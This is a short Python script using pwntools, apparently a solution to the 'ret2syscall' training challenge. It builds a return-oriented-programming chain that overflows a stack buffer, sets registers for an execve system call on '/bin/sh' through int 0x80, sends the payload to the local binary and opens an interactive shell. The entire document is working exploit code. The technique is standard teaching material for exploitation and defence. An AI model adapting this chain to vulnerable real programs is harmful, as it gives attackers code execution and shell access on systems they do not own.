from pwn import *

padding_len = 0x6c+4
eax_ret = 0x080bb196 
ecxebx_ret = 0x0806eb91
edx_ret = 0x0806eb6a 
int_80 = 0x08049421
binsh = 0x080BE408

payload = b'a'*padding_len + p32(eax_ret) + p32(0xb) + p32(ecxebx_ret) + p32(0) + p32(binsh) + p32(edx_ret) + p32(0) + p32(int_80) 

sh = process('./ret2syscall')
sh.sendline(payload)
sh.interactive()
